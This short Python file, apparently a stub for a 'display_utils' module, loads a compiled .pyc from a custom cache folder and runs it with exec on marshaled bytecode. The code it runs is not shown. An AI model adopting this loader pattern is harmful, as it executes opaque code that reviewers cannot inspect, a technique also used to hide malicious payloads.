
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'display_utils_d1ce37f3eefe4250aad91af362112d9e.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
